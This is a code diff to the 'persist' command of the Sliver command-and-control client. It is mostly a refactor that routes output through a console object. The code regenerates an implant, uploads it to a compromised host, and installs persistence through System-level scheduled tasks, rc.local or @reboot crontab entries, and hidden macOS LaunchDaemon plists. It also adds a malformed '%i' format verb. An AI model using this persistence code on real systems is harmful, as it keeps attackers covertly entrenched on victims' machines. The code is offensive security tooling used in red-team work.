@@ -23,17 +23,19 @@ import (
 	"fmt"
 	"strings"
 
-	"github.com/bishopfox/sliver/client/spin"
 	"github.com/bishopfox/sliver/protobuf/clientpb"
-	"github.com/bishopfox/sliver/protobuf/rpcpb"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
 	"github.com/bishopfox/sliver/util/encoders"
+
+	"github.com/bishopfox/sliver/client/console"
 
 	"github.com/desertbit/grumble"
 )
 
-func persist(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
-	session := ActiveSession.Get()
+func persist(ctx *grumble.Context, con *console.SliverConsoleClient) {
+	rpc := con.Rpc
+
+	session := con.ActiveSession.GetInteractive()
 	if session == nil {
 		return
 	}
@@ -42,7 +44,7 @@ func persist(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
 	sliver := ctx.Flags.String("sliver")
 	if sliver == "" {
 		sliver = session.Name
-		fmt.Printf(Info+"Sliver not specified. Defaulting to %s\n", sliver)
+		con.PrintInfof("Sliver not specified. Defaulting to %s\n", sliver)
 	}
 	stageOS := session.OS
 
@@ -53,10 +55,10 @@ func persist(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
 		// %HOMEDRIVE% Variable expansion
 		resp, err := rpc.GetEnv(context.Background(), &sliverpb.EnvReq{
 			Name:    "HOMEDRIVE",
-			Request: ActiveSession.Request(ctx),
+			Request: con.ActiveSession.Request(ctx),
 		})
 		if err != nil {
-			fmt.Printf(Warn+"Error: %v\n", err)
+			con.PrintWarnf("Error: %v\n", err)
 			return
 		}
 		if len(resp.Variables) == 1 {
@@ -67,10 +69,10 @@ func persist(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
 		// %SYSTEMROOT% Variable expansion
 		resp, err = rpc.GetEnv(context.Background(), &sliverpb.EnvReq{
 			Name:    "SYSTEMROOT",
-			Request: ActiveSession.Request(ctx),
+			Request: con.ActiveSession.Request(ctx),
 		})
 		if err != nil {
-			fmt.Printf(Warn+"Error: %v\n", err)
+			con.PrintWarnf("Error: %v\n", err)
 			return
 		}
 		if len(resp.Variables) == 1 {
@@ -97,10 +99,10 @@ func persist(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
 					// %HOMEPATH% Variable expansion
 					resp, err := rpc.GetEnv(context.Background(), &sliverpb.EnvReq{
 						Name:    "HOMEPATH",
-						Request: ActiveSession.Request(ctx),
+						Request: con.ActiveSession.Request(ctx),
 					})
 					if err != nil {
-						fmt.Printf(Warn+"Error: %v\n", err)
+						con.PrintWarnf("Error: %v\n", err)
 						return
 					}
 					if len(resp.Variables) == 1 {
@@ -118,10 +120,10 @@ func persist(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
 					// $HOME Variable expansion
 					resp, err := rpc.GetEnv(context.Background(), &sliverpb.EnvReq{
 						Name:    "HOME",
-						Request: ActiveSession.Request(ctx),
+						Request: con.ActiveSession.Request(ctx),
 					})
 					if err != nil {
-						fmt.Printf(Warn+"Error: %v\n", err)
+						con.PrintWarnf("Error: %v\n", err)
 						return
 					}
 					if len(resp.Variables) == 1 {
@@ -138,11 +140,11 @@ func persist(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
 		} else {
 			path = string(resp.Value)
 		}
-		fmt.Printf(Info+"Path: %s\n", path)
+		con.PrintInfof("Path: %s\n", path)
 	}
 
 	// Persistence is not Op-Sec Safe
-	if !isUserAnAdult() {
+	if !con.IsUserAnAdult() {
 		return
 	}
 
@@ -153,39 +155,39 @@ func persist(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
 		Value:     path,
 	})
 	if err != nil {
-		fmt.Printf(Warn+"Error: %v\n", err)
+		con.PrintWarnf("Error: %v\n", err)
 		return
 	}
 
 	if ctx.Flags.Bool("unload") {
 		switch stageOS {
 		case "windows":
-			fmt.Println(Info + "Info: Removing the file")
+			con.PrintInfof("Info: Removing the file\n")
 			_, err := rpc.Rm(context.Background(), &sliverpb.RmReq{
 				Path:      path,
 				Recursive: false,
 				Force:     true,
-				Request:   ActiveSession.Request(ctx),
+				Request:   con.ActiveSession.Request(ctx),
 			})
 			if err != nil {
-				fmt.Printf(Warn+"Error: %v\n", err)
+				con.PrintWarnf("Error: %v\n", err)
 				// No return incase file was removed
 				// But task is still there
 			}
 
-			fmt.Println(Info + "Info: Removing the task")
+			con.PrintInfof("Info: Removing the task\n")
 			resp, err := rpc.Execute(context.Background(), &sliverpb.ExecuteReq{
 				Path:    systemroot + "\\System32\\schtasks.exe",
 				Args:    []string{"/delete", "/tn", sliver, "/f"},
 				Output:  false,
-				Request: ActiveSession.Request(ctx),
+				Request: con.ActiveSession.Request(ctx),
 			})
 			if err != nil {
-				fmt.Printf(Warn+"Error: %v\n", err)
+				con.PrintWarnf("Error: %v\n", err)
 				return
 			}
 			if resp.Response != nil && resp.Response.Err != "" {
-				fmt.Printf(Warn+"Error: %s\n", resp.Response.Err)
+				con.PrintWarnf("Error: %s\n", resp.Response.Err)
 				return
 			}
 		case "linux":
@@ -193,20 +195,20 @@ func persist(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
 				Path:      path,
 				Recursive: false,
 				Force:     true,
-				Request:   ActiveSession.Request(ctx),
+				Request:   con.ActiveSession.Request(ctx),
 			})
 			if err != nil {
-				fmt.Printf(Warn+"Error: %v\n", err)
+				con.PrintWarnf("Error: %v\n", err)
 				return
 			}
 
 			if session.Username == "root" {
 				resp, err := rpc.Download(context.Background(), &sliverpb.DownloadReq{
 					Path:    "/etc/rc.local",
-					Request: ActiveSession.Request(ctx),
+					Request: con.ActiveSession.Request(ctx),
 				})
 				if err != nil {
-					fmt.Printf(Warn+"Error: %v\n", err)
+					con.PrintWarnf("Error: %v\n", err)
 					return
 				}
 
@@ -219,10 +221,10 @@ func persist(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
 					Path:    "/etc/rc.local",
 					Encoder: "gzip",
 					Data:    new(encoders.Gzip).Encode([]byte(strings.Join(rc[:], "\n"))),
-					Request: ActiveSession.Request(ctx),
+					Request: con.ActiveSession.Request(ctx),
 				})
 				if err != nil {
-					fmt.Printf(Warn+"Error: %v\n", err)
+					con.PrintWarnf("Error: %v\n", err)
 					return
 				}
 			} else {
@@ -230,14 +232,14 @@ func persist(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
 					Path:    "/bin/sh",
 					Args:    []string{"-c", "crontab -r"},
 					Output:  false,
-					Request: ActiveSession.Request(ctx),
+					Request: con.ActiveSession.Request(ctx),
 				})
 				if err != nil {
-					fmt.Printf(Warn+"Error: %v\n", err)
+					con.PrintWarnf("Error: %v\n", err)
 					return
 				}
 				if resp.Response != nil && resp.Response.Err != "" {
-					fmt.Printf(Warn+"Error: %s\n", resp.Response.Err)
+					con.PrintWarnf("Error: %s\n", resp.Response.Err)
 					return
 				}
 			}
@@ -246,10 +248,10 @@ func persist(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
 				Path:      path,
 				Recursive: false,
 				Force:     true,
-				Request:   ActiveSession.Request(ctx),
+				Request:   con.ActiveSession.Request(ctx),
 			})
 			if err != nil {
-				fmt.Printf(Warn+"Error: %v\n", err)
+				con.PrintWarnf("Error: %v\n", err)
 				return
 			}
 
@@ -274,14 +276,14 @@ func persist(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
 				Path:    "/bin/launchctl",
 				Args:    []string{"unload", path},
 				Output:  false,
-				Request: ActiveSession.Request(ctx),
+				Request: con.ActiveSession.Request(ctx),
 			})
 			if err != nil {
-				fmt.Printf(Warn+"Error: %v\n", err)
+				con.PrintWarnf("Error: %v\n", err)
 				return
 			}
 			if resp.Response != nil && resp.Response.Err != "" {
-				fmt.Printf(Warn+"Error: %s\n", resp.Response.Err)
+				con.PrintWarnf("Error: %s\n", resp.Response.Err)
 				return
 			}
 
@@ -289,19 +291,19 @@ func persist(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
 				Path:      path,
 				Recursive: false,
 				Force:     true,
-				Request:   ActiveSession.Request(ctx),
+				Request:   con.ActiveSession.Request(ctx),
 			})
 			if err != nil {
-				fmt.Printf(Warn+"Error: %v\n", err)
+				con.PrintWarnf("Error: %v\n", err)
 				return
 			}
 		}
-		fmt.Println(Info + "Done!")
+		con.PrintInfof("Done!\n")
 		return
 	}
 
 	ctrl := make(chan bool)
-	go spin.Until("Regenerating sliver, please wait ...", ctrl)
+	go con.SpinUntil("Regenerating sliver, please wait ...", ctrl)
 	stageFile, err := rpc.Regenerate(context.Background(), &clientpb.RegenerateReq{
 		ImplantName: sliver,
 	})
@@ -309,31 +311,31 @@ func persist(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
 	<-ctrl
 
 	if err != nil {
-		fmt.Printf(Warn+"Error: %v", err)
+		con.PrintWarnf("Error: %v", err)
 		return
 	}
 
-	fmt.Println(Info + "Sliver regenerated. (Pretty much Indestructible)")
+	con.PrintInfof("Sliver regenerated. (Pretty much Indestructible)\n")
 	exe := string(stageFile.GetFile().GetData())
 
 	// Upload file
 	gzip := new(encoders.Gzip)
 	ctrl = make(chan bool)
-	go spin.Until("Uploading the sliver, please wait...", ctrl)
+	go con.SpinUntil("Uploading the sliver, please wait...", ctrl)
 	resp, err := rpc.Upload(context.Background(), &sliverpb.UploadReq{
 		Path:    path,
 		Encoder: "gzip",
 		Data:    gzip.Encode([]byte(exe)),
-		Request: ActiveSession.Request(ctx),
+		Request: con.ActiveSession.Request(ctx),
 	})
 	ctrl <- true
 	<-ctrl
 	if err != nil {
-		fmt.Printf(Warn+"Error: %v", err)
+		con.PrintWarnf("Error: %v", err)
 		return
 	}
 	path = resp.Path
-	fmt.Printf(Info+"Path: %s\n", path)
+	con.PrintInfof("Path: %s\n", path)
 
 	switch stageOS {
 	case "windows":
@@ -344,14 +346,14 @@ func persist(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
 				Path:    systemroot + "\\System32\\schtasks.exe",
 				Args:    []string{"/create", "/tn", sliver, "/tr", path, "/sc", "onstart", "/ru", "System", "/f"},
 				Output:  false,
-				Request: ActiveSession.Request(ctx),
+				Request: con.ActiveSession.Request(ctx),
 			})
 			if err != nil {
-				fmt.Printf(Warn+"Error: %v\n", err)
+				con.PrintWarnf("Error: %v\n", err)
 				return
 			}
 			if resp.Response != nil && resp.Response.Err != "" {
-				fmt.Printf(Warn+"Error: %s\n", resp.Response.Err)
+				con.PrintWarnf("Error: %s\n", resp.Response.Err)
 				return
 			}
 		} else {
@@ -359,18 +361,23 @@ func persist(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
 			// Note that windows prevents onlogon and onstart from userland
 			// By using minutely, schtasks will check the process every minute,
 			// and restart it if it has terminated.
+			interval := ctx.Flags.Int("interval")
+			if interval <= 0 {
+				con.PrintErrorf("Error: Must specify interval for windows userland persistence.")
+				return
+			}
 			resp, err := rpc.Execute(context.Background(), &sliverpb.ExecuteReq{
 				Path:    systemroot + "\\System32\\schtasks.exe",
-				Args:    []string{"/create", "/tn", sliver, "/tr", path, "/sc", "minute", "/ru", session.Username, "/f"},
+				Args:    []string{"/create", "/tn", sliver, "/tr", path, "/sc", "minute", "/mo", fmt.Sprintf("%i", interval), "/ru", session.Username, "/f"},
 				Output:  false,
-				Request: ActiveSession.Request(ctx),
+				Request: con.ActiveSession.Request(ctx),
 			})
 			if err != nil {
-				fmt.Printf(Warn+"Error: %v\n", err)
+				con.PrintWarnf("Error: %v\n", err)
 				return
 			}
 			if resp.Response != nil && resp.Response.Err != "" {
-				fmt.Printf(Warn+"Error: %s\n", resp.Response.Err)
+				con.PrintWarnf("Error: %s\n", resp.Response.Err)
 				return
 			}
 		}
@@ -379,14 +386,14 @@ func persist(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
 			Path:    "/bin/chmod",
 			Args:    []string{"0100", path},
 			Output:  false,
-			Request: ActiveSession.Request(ctx),
+			Request: con.ActiveSession.Request(ctx),
 		})
 		if err != nil {
-			fmt.Printf(Warn+"Error: %v\n", err)
+			con.PrintWarnf("Error: %v\n", err)
 			return
 		}
 		if resp.Response != nil && resp.Response.Err != "" {
-			fmt.Printf(Warn+"Error: %s\n", resp.Response.Err)
+			con.PrintWarnf("Error: %s\n", resp.Response.Err)
 			return
 		}
 
@@ -394,10 +401,10 @@ func persist(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
 			// Root persistence (rc.local)
 			resp, err := rpc.Download(context.Background(), &sliverpb.DownloadReq{
 				Path:    "/etc/rc.local",
-				Request: ActiveSession.Request(ctx),
+				Request: con.ActiveSession.Request(ctx),
 			})
 			if err != nil {
-				fmt.Printf(Warn+"Error: %v\n", err)
+				con.PrintWarnf("Error: %v\n", err)
 				return
 			}
 
@@ -410,10 +417,10 @@ func persist(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
 				Path:    "/etc/rc.local",
 				Encoder: "gzip",
 				Data:    gzip.Encode([]byte(strings.Join(rc[:], "\n"))),
-				Request: ActiveSession.Request(ctx),
+				Request: con.ActiveSession.Request(ctx),
 			})
 			if err != nil {
-				fmt.Printf(Warn+"Error: %v\n", err)
+				con.PrintWarnf("Error: %v\n", err)
 				return
 			}
 		} else {
@@ -422,14 +429,14 @@ func persist(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
 				Path:    "/bin/sh",
 				Args:    []string{"-c", fmt.Sprintf("echo \"@reboot %s\" | crontab -", path)},
 				Output:  false,
-				Request: ActiveSession.Request(ctx),
+				Request: con.ActiveSession.Request(ctx),
 			})
 			if err != nil {
-				fmt.Printf(Warn+"Error: %v\n", err)
+				con.PrintWarnf("Error: %v\n", err)
 				return
 			}
 			if resp.Response != nil && resp.Response.Err != "" {
-				fmt.Printf(Warn+"Error: %s\n", resp.Response.Err)
+				con.PrintWarnf("Error: %s\n", resp.Response.Err)
 				return
 			}
 		}
@@ -438,14 +445,14 @@ func persist(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
 			Path:    "/bin/chmod",
 			Args:    []string{"0100", path},
 			Output:  false,
-			Request: ActiveSession.Request(ctx),
+			Request: con.ActiveSession.Request(ctx),
 		})
 		if err != nil {
-			fmt.Printf(Warn+"Error: %v\n", err)
+			con.PrintWarnf("Error: %v\n", err)
 			return
 		}
 		if resp.Response != nil && resp.Response.Err != "" {
-			fmt.Printf(Warn+"Error: %s\n", resp.Response.Err)
+			con.PrintWarnf("Error: %s\n", resp.Response.Err)
 			return
 		}
 
@@ -459,7 +466,7 @@ func persist(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
 		plist += "</string><key>RunAtLoad</key><true/>"
 		plist += "<key>KeepAlive</key><true/>"
 		plist += "</dict></plist>"
-		fmt.Println(Info + "Plist: " + plist)
+		//fmt.Println(con.Info + "Plist: " + plist)
 		if session.Username == "root" {
 			// Root persistence (launchctl)
 			path = "/Library/LaunchDaemons/." + sliver + ".plist"
@@ -494,10 +501,10 @@ func persist(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
 			Path:    path,
 			Encoder: "gzip",
 			Data:    gzip.Encode([]byte(plist)),
-			Request: ActiveSession.Request(ctx),
+			Request: con.ActiveSession.Request(ctx),
 		})
 		if err != nil {
-			fmt.Printf(Warn+"Error: %v\n", err)
+			con.PrintWarnf("Error: %v\n", err)
 			return
 		}
 
@@ -505,16 +512,16 @@ func persist(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
 			Path:    "/bin/launchctl",
 			Args:    []string{"load", path},
 			Output:  false,
-			Request: ActiveSession.Request(ctx),
+			Request: con.ActiveSession.Request(ctx),
 		})
 		if err != nil {
-			fmt.Printf(Warn+"Error: %v\n", err)
+			con.PrintWarnf("Error: %v\n", err)
 			return
 		}
 		if resp.Response != nil && resp.Response.Err != "" {
-			fmt.Printf(Warn+"Error: %s\n", resp.Response.Err)
+			con.PrintWarnf("Error: %s\n", resp.Response.Err)
 			return
 		}
 	}
-	fmt.Println(Info + "Done!")
+	con.PrintInfof("Done!\n")
 }
